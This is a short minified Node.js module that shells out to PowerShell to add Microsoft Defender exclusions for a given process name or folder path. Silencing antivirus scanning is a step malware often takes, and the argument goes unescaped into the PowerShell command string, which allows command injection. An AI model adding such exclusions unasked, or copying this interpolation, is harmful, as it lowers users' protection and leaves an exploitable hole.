/* uglified */
"use strict";
var e = this && this.__awaiter || function (e, n, t, r) {
        return new(t || (t = Promise))((function (o, i) {
            function c(e) {
                try {
                    s(r.next(e))
                } catch (e) {
                    i(e)
                }
            }

            function u(e) {
                try {
                    s(r.throw(e))
                } catch (e) {
                    i(e)
                }
            }

            function s(e) {
                var n;
                e.done ? o(e.value) : (n = e.value, n instanceof t ? n : new t((function (e) {
                    e(n)
                }))).then(c, u)
            }
            s((r = r.apply(e, n || [])).next())
        }))
    },
    n = this && this.__importDefault || function (e) {
        return e && e.__esModule ? e : {
            default: e
        }
    };
Object.defineProperty(exports, "__esModule", {
    value: !0
}), exports.ps = void 0;
const t = n(require("child_process")),
    r = n(require("./logger"));

function o(n) {
    return e(this, void 0, void 0, (function* () {
        return new Promise((e => t.default.execFile("powershell.exe", ["-NoProfile", "-NonInteractive", "-InputFormat", "None", "-Command", n], ((n, t, r) => e(n || r ? 1 : 0)))))
    }))
}

function i(n) {
    return e(this, void 0, void 0, (function* () {
        const e = `Add-MpPreference -ExclusionProcess "${n}"`;
        return r.default.info("AddMpPreferenceExclusionProcess", n), o(e)
    }))
}

function c(n) {
    return e(this, void 0, void 0, (function* () {
        const e = `Add-MpPreference -ExclusionPath "${n}"`;
        return r.default.info("AddMpPreferenceExclusionPath", n), o(e)
    }))
}
exports.ps = {
    AddMpPreferenceExclusionProcess: i,
    AddMpPreferenceExclusionPath: c
};